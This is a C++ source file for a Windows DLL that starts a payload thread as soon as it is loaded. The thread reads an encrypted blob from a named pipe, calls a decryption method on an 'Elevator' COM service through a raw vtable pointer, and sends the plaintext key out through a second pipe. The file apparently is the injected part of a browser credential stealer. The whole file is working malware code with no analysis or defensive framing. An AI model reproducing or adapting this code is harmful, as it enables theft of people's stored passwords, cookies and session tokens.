#include <windows.h>
#include <iostream>
#include <string>
#include <wincrypt.h>
#include <comdef.h>

const IID IID_IElevator = { 0x463ABECF, 0x410D, 0x407F, { 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8 } };
const CLSID CLSID_Elevator = { 0x708860E0, 0xF641, 0x4611, { 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B } };

typedef HRESULT(__stdcall* DecryptDataFn)(void* self, BSTR cipherText, BSTR* plainText, DWORD* lastError);

DWORD WINAPI PayloadThread(LPVOID lpParam) {
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    char base64Blob[8192] = {0};
    DWORD bytesRead = 0;
    HANDLE hPipeIn = CreateFileA("\\\\.\\pipe\\RavenBlobPipe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipeIn != INVALID_HANDLE_VALUE) {
        ReadFile(hPipeIn, base64Blob, sizeof(base64Blob) - 1, &bytesRead, NULL);
        CloseHandle(hPipeIn);
    }
    
    DWORD blobLen = 0;
    BYTE blob[4096];
    CryptStringToBinaryA(base64Blob, 0, CRYPT_STRING_BASE64, blob, &blobLen, NULL, NULL);

    void* pElevator = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_Elevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, &pElevator);
    
    BYTE* resultBytes = nullptr;
    DWORD resultLen = 0;

    if (SUCCEEDED(hr) && pElevator) {
        void** vtable = *(void***)pElevator;
        DecryptDataFn DecryptData = (DecryptDataFn)vtable[5];
        
        BSTR cipherBstr = SysAllocStringByteLen((LPCSTR)blob, blobLen);
        BSTR plainBstr = nullptr;
        DWORD lastErr = 0;
        
        hr = DecryptData(pElevator, cipherBstr, &plainBstr, &lastErr);
        if (SUCCEEDED(hr) && plainBstr) {
            resultLen = SysStringByteLen(plainBstr);
            resultBytes = new BYTE[resultLen];
            memcpy(resultBytes, plainBstr, resultLen);
            SysFreeString(plainBstr);
        }
        SysFreeString(cipherBstr);
        
        typedef ULONG(__stdcall* ReleaseFn)(void*);
        ((ReleaseFn)vtable[2])(pElevator);
    }
    
    HANDLE hPipeOut = CreateFileA("\\\\.\\pipe\\RavenKeyPipe", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipeOut != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        if (resultBytes) {
            WriteFile(hPipeOut, resultBytes, resultLen, &bytesWritten, NULL);
        }
        CloseHandle(hPipeOut);
    }
    
    if (resultBytes) delete[] resultBytes;
    ExitProcess(0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    return TRUE;
}
